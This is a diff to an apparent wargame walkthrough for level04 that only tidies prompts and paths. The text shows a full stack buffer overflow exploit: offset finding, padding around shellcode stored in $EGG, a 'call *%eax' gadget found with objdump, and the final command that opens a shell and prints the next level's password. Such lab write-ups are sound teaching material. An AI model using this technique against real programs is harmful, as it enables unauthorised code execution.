@@ -79,7 +79,7 @@ We can use this to guess the right location.
 We know that the size of `buf` is 1024,
 so let's run the program with a longer string:
 ```
-level03@box:/levels/level04$ gdb ./level04
+$ gdb /levels/level04/level04
 (gdb) run $(python -c 'print "A" * 1100')
 Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1100')
 
@@ -99,7 +99,7 @@ Program received signal SIGSEGV, Segmentation fault.
 That looks within our `abc...` sequence.
 Let's check the ASCII codes to find the exact location:
 ```
-level03@box:/levels/level04$ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
+$ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
 00000000  61 62 63 64 65 66 67 68  69 6a 6b 6c 6d 6e 6f 70  |abcdefghijklmnop|
 00000010  71 72 73 74 75 76 77 78  79 7a 0a                 |qrstuvwxyz.|
 0000001b
@@ -127,7 +127,7 @@ Where `S` indicate the shellcode,
 We calculated the length of `S + P = 1036`,
 to know the length of `P` alone we must find the length of `S`:
 ```
-level03@box:/levels/level04$ printf $EGG | wc -c
+$ printf $EGG | wc -c
 45
 ```
 Thus, the length of the padding should be `1036 - 45 = 991` characters.
@@ -155,7 +155,7 @@ a `call *%eax` instruction executes the code at the address stored in `%eax`,
 so if there is any such instruction inside the code,
 we can use its address:
 ```
-level03@box:/levels/level04$ objdump -d level04 | grep call.*eax
+$ objdump -d /levels/level04/level04 | grep call.*eax
  8048488:   ff 14 85 1c 9f 04 08    call   *0x8049f1c(,%eax,4)
  80484cf:   ff d0                   call   *%eax
  80485fb:   ff d0                   call   *%eax
@@ -163,7 +163,7 @@ level03@box:/levels/level04$ objdump -d level04 | grep call.*eax
 Bingo!
 We can use either `0x080484cf` or `0x080485fb` as the address:
 ```
-level03@box:/levels/level04$ ./level04 $EGG$(python -c 'print "A" * 991')$(printf '\xcf\x84\x04\x08')
+$ /levels/level04/level04 $EGG$(python -c 'print "A" * 991')$(printf '\xcf\x84\x04\x08')
 /levels/level04 $ cat /home/level04/.password 
 paegeiqu
 ```
